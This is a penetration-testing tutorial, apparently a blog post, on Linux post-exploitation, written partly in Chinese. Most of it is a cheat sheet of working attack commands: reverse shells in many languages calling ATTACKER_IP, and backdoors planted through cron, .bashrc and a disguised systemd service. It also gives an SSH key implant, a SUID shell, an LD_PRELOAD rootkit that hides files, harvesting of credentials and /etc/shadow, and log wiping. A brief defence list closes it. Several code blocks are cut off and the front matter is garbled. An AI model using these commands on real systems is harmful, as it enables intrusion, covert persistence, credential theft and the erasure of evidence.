---
title: "Linux post-exploitation and persistence—rebound shell, SSH tunnel, rootkit"
url: "en/linux-post-exploitation"
date: "2026-01-14"
draft: false
summary: "Comprehensive collection of rebound shell technologies, practical implementation of three SSH tunnel modes, multiple persistent backdoor deployment and trace cleaning technologies"
authors: ["default"]
tags:
  - Linux
  - post penetration
  - Bounce Shell
  - persistence
images: ["https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?auto=formatimages: ["https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?auto=format&fit=crop&w=1200&q=80"]fit=cropimages: ["https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?auto=format&fit=crop&w=1200&q=80"]w=1200images: ["https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?auto=format&fit=crop&w=1200&q=80"]q=80"]
categories:
  - Penetration testing
---

#Linux post-exploitation and persistence—rebound shell, SSH tunnel, rootkit

When a penetration tester successfully gains access to a target system, the work is not over. The goal of the post-exploitation phase is to maintain access, deeply explore the intranet, collect sensitive data, and establish persistent backdoors. This article will systematically explain the various technologies of rebound shell, shell upgrade methods, SSH tunnel construction, persistence methods, trace cleaning and other key post-penetration technologies. These are important contents that need to be covered in the penetration test report.

## Rebound Shell Technology Encyclopedia

Reverse Shell is one of the most basic techniques in penetration testing. The target machine actively connects to the attacker's listening port, bypassing the firewall's inbound restrictions.

### Attack-side listening settings

Before sending any rebound shell, you need to set up a listener on the attacking machine:

```bash
# 使用 Netcat 监听
nc -lvnp 4444

# 使用 rlwrap 增强 Netcat（提供命令行编辑和历史功能）
rlwrap nc -lvnp 4444

# 使用 socat 监听（支持更稳定的连接）
socat file:`tty`,raw,echo=0 tcp-listen:4444

# 使用 Metasploit multi/handler
msfconsole -q
msf6 > use exploit/multi/handler
msf6 exploit(handler) > set payload linux/x64/shell_reverse_tcp
msf6 exploit(handler) > set LHOST 0.0.0.0
msf6 exploit(handler) > set LPORT 4444
msf6 exploit(handler) > exploit
```

### Bash 反弹 Shell

```bash
# 标准 Bash 反弹 Shell
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Use exec method

# 0<&196 way

# Using /dev/udp (UDP bounce shell)

### Python bounce shell

```python
# Python 3 反弹 Shell
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Python 2 版本
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

```bash
# 命令行直接使用
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### Netcat rebound shell

```bash
# 标准 Netcat（带 -e 参数）
nc -e /bin/bash ATTACKER_IP 4444

# 某些版本的 Netcat 不支持 -e，使用命名管道代替
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP 4444 > /tmp/f

# 使用 ncat（Nmap 的 Netcat）
ncat ATTACKER_IP 4444 -e /bin/bash

# Netcat OpenBSD 版本（无 -e）
nc ATTACKER_IP 4444 -c /bin/bash
```

### PHP 反弹 Shell

```bash
# PHP 命令行反弹 Shell
php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# PHP complete rebound shell (applicable to Web Shell scenarios)

### Perl bounce shell

```bash
perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Ruby 反弹 Shell

```bash
ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Other rebound shells

```bash
# Socat 反弹 Shell（更稳定）
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444

# OpenSSL 加密反弹 Shell
# 攻击端生成证书并监听
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 4444

# 目标端连接
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ATTACKER_IP:4444 > /tmp/s; rm /tmp/s

# PowerShell 反弹 Shell（如果目标安装了 PowerShell Core）
pwsh -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# xterm 反弹
xterm -display ATTACKER_IP:0
# 攻击端需要运行 Xnest :0 或 xhost +target_ip
```

## Shell 升级技术

通过反弹 Shell 获得的通常是一个非交互式的简陋 Shell，无法使用 Tab 补全、方向键、Ctrl+C 等。需要进行 Shell 升级。

### Python PTY 升级

```bash
# 步骤 1: 在反弹 Shell 中生成 PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Step 2: Press Ctrl+Z to put the shell into the background

# Step 3: Execute locally on the attacking machine

# Step 4: Set up the terminal after returning to the bounce shell

# Now you have a fully interactive shell

### Use script command to upgrade

```bash
# 如果目标没有 Python
script /dev/null -c /bin/bash

# 然后同样执行 Ctrl+Z 和 stty raw -echo; fg
```

### 使用 socat 升级

```bash
# 攻击端监听（完全交互式）
socat file:`tty`,raw,echo=0 tcp-listen:4444

# target connection

## SSH tunneling technology

SSH tunnel is one of the most important network technologies in post-infiltration. It can be used to access intranet resources, bypass firewalls, and establish proxy channels.

### Local Port Forwarding

Forward traffic from the local port of the attacking machine to a service on the target intranet.

```bash
# 语法: ssh -L 本地端口:目标地址:目标端口 跳板机用户@跳板机地址

# 场景：通过跳板机访问内网的 Web 服务
# 内网 Web 服务地址：10.10.10.20:80
# 跳板机地址：192.168.1.100
ssh -L 8080:10.10.10.20:80 user@192.168.1.100

# 现在访问本地 http://localhost:8080 即可访问内网 Web 服务

# 访问内网的 RDP 服务
ssh -L 3389:10.10.10.30:3389 user@192.168.1.100
# 使用 rdesktop localhost 连接

# 访问内网的数据库
ssh -L 3306:10.10.10.40:3306 user@192.168.1.100
# mysql -h 127.0.0.1 -P 3306 -u root -p

# 后台运行隧道（-f 后台, -N 不执行命令）
ssh -f -N -L 8080:10.10.10.20:80 user@192.168.1.100
```

### 远程端口转发（Remote Port Forwarding）

将目标机器上的端口转发到攻击机，适用于目标机器无法被直接访问的场景。

```bash
# 语法: ssh -R 远程端口:目标地址:目标端口 攻击机用户@攻击机地址

# Scenario: Expose the target intranet service to the attacking machine

# The attacking machine can now access the target's port 80 via localhost:8080

# Forward the service from another machine in the intranet

# Running in the background

### Dynamic port forwarding (SOCKS proxy)

Create a SOCKS proxy that can access any service on the target intranet.

```bash
# 语法: ssh -D 本地端口 跳板机用户@跳板机地址

# 建立 SOCKS5 代理
ssh -D 1080 user@192.168.1.100

# 后台运行
ssh -f -N -D 1080 user@192.168.1.100

# 配置浏览器使用 SOCKS5 代理：127.0.0.1:1080

# 使用 proxychains 通过代理执行命令
# 配置 /etc/proxychains4.conf
# socks5 127.0.0.1 1080

# 通过代理扫描内网
proxychains nmap -sT -Pn 10.10.10.0/24
proxychains curl http://10.10.10.20
proxychains ssh user@10.10.10.30

# 使用 chisel 作为替代（当 SSH 不可用时）
# 攻击端（服务端）
./chisel server -p 8000 --reverse

# 目标端（客户端）
./chisel client ATTACKER_IP:8000 R:socks
# 会在攻击端 1080 端口创建 SOCKS 代理
```

### 三层隧道嵌套

```bash
# 场景: 攻击机 -> 跳板机1 -> 跳板机2 -> 目标内网

# The first layer: connect to the springboard machine 1 and establish a SOCKS proxy

# Layer 2: Connect to Springboard 2 through a proxy

# Access deep intranet through double-layer proxy

## persistence technology

The purpose of persistence is to be able to regain access after the target system is restarted or the password is changed.

### SSH key implantation

```bash
# 生成 SSH 密钥对（在攻击机上）
ssh-keygen -t rsa -b 4096 -f /tmp/backdoor_key -N ""

# 将公钥写入目标的 authorized_keys
# 在目标机器上执行
mkdir -p ~/.ssh
echo "ssh-rsa AAAA...（你的公钥内容）" >> ~/.ssh/authorized_keys
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys

# 攻击机使用私钥登录（无需密码）
ssh -i /tmp/backdoor_key user@192.168.1.100

# 更隐蔽：写入 root 的 authorized_keys
echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys
```

### Cron 后门

```bash
# 方法一：用户级 cron 后门
(crontab -l 2>/dev/null; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'") | crontab -

# Method 2: System-level cron backdoor

# Method 3: Check and reestablish the connection regularly

### .bashrc / .profile backdoor

```bash
# 当用户登录时自动执行
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &' >> ~/.bashrc

# 更隐蔽的方式
echo 'nohup bash -c "sleep 10 && bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" &>/dev/null &' >> ~/.bashrc

# 写入 .profile（登录时执行）
echo 'nohup bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" &>/dev/null &' >> ~/.profile
```

### systemd 服务后门

```bash
# 创建恶意 systemd 服务
cat > /etc/systemd/system/system-update.service << 'EOF'
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF

# Enable and start the service

# Check service status

### SUID backdoor

```bash
# 复制 bash 并设置 SUID 位
cp /bin/bash /tmp/.hidden_bash
chmod u+s /tmp/.hidden_bash

# 以后使用
/tmp/.hidden_bash -p
# 获得 root shell

# 更隐蔽：放在不显眼的目录
cp /bin/bash /usr/local/share/.cache
chmod u+s /usr/local/share/.cache
```

## Rootkit 概念

Rootkit 是一种隐藏攻击者存在和活动的恶意软件。它分为用户态和内核态两种类型。

### 用户态 Rootkit

用户态 Rootkit 通过替换系统命令或劫持库函数来隐藏恶意活动。

```bash
# LD_PRELOAD 劫持示例（概念演示）
# 编写恶意共享库，hook readdir 函数来隐藏特定文件

cat > /tmp/hide.c << 'EOF'
#define _GNU_SOURCE
#include <dirent.h>
#include <dlfcn.h>
#include <string.h>

struct dirent *readdir(DIR *dirp) {
    struct dirent *(*original_readdir)(DIR *);
    original_readdir = dlsym(RTLD_NEXT, "readdir");
    struct dirent *entry;
    while ((entry = original_readdir(dirp)) != NULL) {
        //Hide files starting with .hidden_
        if (strncmp(entry->d_name, ".hidden_", 8) != 0) {
            return entry;
        }
    }
    return NULL;
}
EOF

gcc -shared -fPIC -o /tmp/hide.so /tmp/hide.c -ldl

# Set LD_PRELOAD (affects all programs)

# At this time, commands such as ls will not be able to see files starting with .hidden_

## Data collection and lateral movement

### Sensitive data collection

```bash
# 搜索密码和凭据文件
grep -rli "password" /etc/ /home/ /var/ 2>/dev/null
grep -rli "passwd" /etc/ /home/ 2>/dev/null

# 搜索 SSH 密钥
find / -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" -o -name "*.pem" 2>/dev/null

# 搜索数据库凭据
grep -rli "db_password\|DB_PASS\|mysql\|postgres" /var/www/ /etc/ /opt/ 2>/dev/null

# 搜索配置文件中的密码
find / -name "*.conf" -o -name "*.cfg" -o -name "*.ini" -o -name ".env" 2>/dev/null | xargs grep -li "pass\|secret\|key\|token" 2>/dev/null

# 查看命令历史
cat ~/.bash_history
cat ~/.zsh_history
cat /home/*/.bash_history

# 查看最近修改的文件
find / -mtime -7 -type f 2>/dev/null | head -50

# 导出数据库
mysqldump -u root -p'password' --all-databases > /tmp/db_dump.sql

# 打包敏感数据
tar czf /tmp/loot.tar.gz /etc/shadow /etc/passwd /home/*/.ssh/ /var/www/ 2>/dev/null
```

### 横向移动

```bash
# 使用收集到的 SSH 密钥连接其他主机
ssh -i /home/user/.ssh/id_rsa user@10.10.10.20

# Use the collected password to try to log in to other hosts

# Bulk password spraying

# Forwarding via SSH agent

## trace cleaning

After the penetration test is completed (authorized testing only), the traces left behind need to be cleaned up.

```bash
# 清除命令历史
history -c
echo "" > ~/.bash_history
rm -f ~/.bash_history

# 清除日志
echo "" > /var/log/auth.log
echo "" > /var/log/syslog
echo "" > /var/log/apache2/access.log
echo "" > /var/log/apache2/error.log

# 清除 lastlog 和 wtmp
echo "" > /var/log/lastlog
echo "" > /var/log/wtmp
echo "" > /var/log/btmp

# 修改文件时间戳
# 将文件时间戳改为与周围文件一致
touch -r /etc/hosts /tmp/backdoor_file

# 清除临时文件
rm -rf /tmp/exploit* /tmp/linpeas* /tmp/shell*

# 删除添加的用户
userdel -r hacker

# 移除 SSH 密钥
sed -i '/attacker_key/d' /root/.ssh/authorized_keys

# 移除 cron 后门
crontab -r
sed -i '/ATTACKER_IP/d' /etc/crontab

# 移除 systemd 后门
systemctl disable system-update.service
rm /etc/systemd/system/system-update.service
systemctl daemon-reload
```

## 防御建议

1. **网络监控**：部署 IDS/IPS 检测异常的出站连接和隧道流量
2. **端口限制**：使用防火墙严格限制出站连接，仅允许必要的端口和目标
3. **SSH 加固**：禁用 SSH 端口转发（`AllowTcpForwarding no`），限制 SSH 密钥
4. **文件完整性监控**：使用 AIDE/OSSEC 监控关键系统文件（`/etc/passwd`、`/etc/crontab`、systemd 服务）
5. **日志集中管理**：将日志发送到远程日志服务器（如 ELK/Splunk），防止本地日志被篡改
6. **进程监控**：监控异常进程和网络连接，使用 EDR 工具检测恶意行为
7. **定期审计**：定期检查 authorized_keys、crontab、systemd 服务、SUID 文件
8. **最小权限**：限制用户的 sudo 权限和文件访问权限

## 总结

本文全面讲解了 Linux 后渗透阶段的核心技术，包括各种反弹 Shell 方法（Bash、Python、Netcat、PHP、Perl、Ruby）、Shell 升级技术、SSH 隧道（本地转发、远程转发、动态代理）、持久化手段（SSH 密钥、Cron 后门、systemd 服务、SUID 后门）以及痕迹清理方法。后渗透是渗透测试中技术含量最高的阶段，需要扎实的系统知识和丰富的实战经验。在合法的渗透测试中，这些技术帮助我们验证安全防护体系的有效性；在防御方面，理解这些攻击手段是构建纵深防御体系的基础。下一篇文章我们将深入学习 Metasploit 框架的完整实战流程。

